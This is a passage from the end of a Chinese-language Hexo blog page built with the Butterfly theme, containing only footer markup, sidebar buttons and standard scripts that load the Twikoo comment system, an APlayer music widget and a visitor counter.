target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(()=>{
  const $countDom = document.getElementById('twikoo-count')
  const init = () => {
    let initData = {
      el: '#twikoo-wrap',
      envId: 'twikoo-4gnvxfbj1bbb1ab6',
      region: ''
    }

    if (false) {
      const otherData = false
      initData = Object.assign(initData, otherData)
    }
    
    twikoo.init(initData)
  }

  const getCount = () => {
    twikoo.getCommentsCount({
      envId: 'twikoo-4gnvxfbj1bbb1ab6',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      $countDom.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const loadTwikoo = (bool = false) => {
    if (typeof twikoo === 'object') {
      init()
      bool && $countDom && setTimeout(getCount,0)
    } else {
      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
        init()
        bool && $countDom && setTimeout(getCount,0)
      })
    }
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo(true)
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>